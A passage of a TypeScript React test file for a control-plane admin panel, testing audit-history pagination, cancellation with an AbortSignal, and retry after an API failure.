    expect(reencryptActions).toHaveLength(2);

    expect(
      screen.getByText('Configured (v1) → Configured (v2)'),
    ).toBeInTheDocument();
    expect(
      screen.getByText('Configured → Configured (v2)'),
    ).toBeInTheDocument();
  });
});

describe('audit query pagination', () => {
  const event = (id: string) => ({
    id,
    actorUserId: id,
    action: 'featureFlag.setPlatformOverride',
    resourceKey: 'agents.enabled',
    organizationId: null,
    occurredAt: '2026-09-05T10:00:00Z',
    before: null,
    after: null,
  });
  it('appends with a cancellation signal and restarts at page one after failure', async () => {
    allowGlobalPermissions('controlPlane:read');
    listControlPlaneAudit
      .mockResolvedValueOnce({ items: [event('first')], nextCursor: 'c1' })
      .mockResolvedValueOnce({ items: [event('second')], nextCursor: 'c2' })
      .mockRejectedValueOnce(new ApiUnavailableError())
      .mockResolvedValueOnce({ items: [event('fresh')], nextCursor: null });
    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/audit history/i);
    await userEvent.click(
      await screen.findByRole('button', { name: /load more/i }),
    );
    await screen.findByText('second');
    expect(screen.getByText('first')).toBeInTheDocument();
    expect(listControlPlaneAudit.mock.calls[1]![0]).toEqual({
      cursor: 'c1',
      signal: expect.any(AbortSignal),
    });
    await userEvent.click(screen.getByRole('button', { name: /load more/i }));
    await screen.findByText(/could not be reached/i);
    expect(listControlPlaneAudit).toHaveBeenCalledTimes(3);
    await userEvent.click(screen.getByRole('button', { name: /try again/i }));
    await screen.findByText('fresh');
    expect(screen.queryByText('first')).not.toBeInTheDocument();
    expect(listControlPlaneAudit.mock.calls[3]![0].cursor).toBeUndefined();
  });

  it('cancels an append when the audit panel closes', async () => {
    allowGlobalPermissions('controlPlane:read');
    let finish!: (value: unknown) => void;
    listControlPlaneAudit
      .mockResolvedValueOnce({ items: [event('first')], nextCursor: 'c1' })
      .mockImplementationOnce(
        () =>
          new Promise((resolve) => {
            finish = resolve;
          }),
      );
    const view = renderWithProviders(<ControlPlaneBlock />);
    await openTab(/audit history/i);
    await userEvent.click(
      await screen.findByRole('button', { name: /load more/i }),
    );
    const signal = listControlPlaneAudit.mock.calls[1]![0]
      .signal as AbortSignal;
    view.unmount();
    expect(signal.aborted).toBe(true);
    await act(async () => finish({ items: [event('late')], nextCursor: null }));
    expect(screen.queryByText('late')).not.toBeInTheDocument();
  });
});
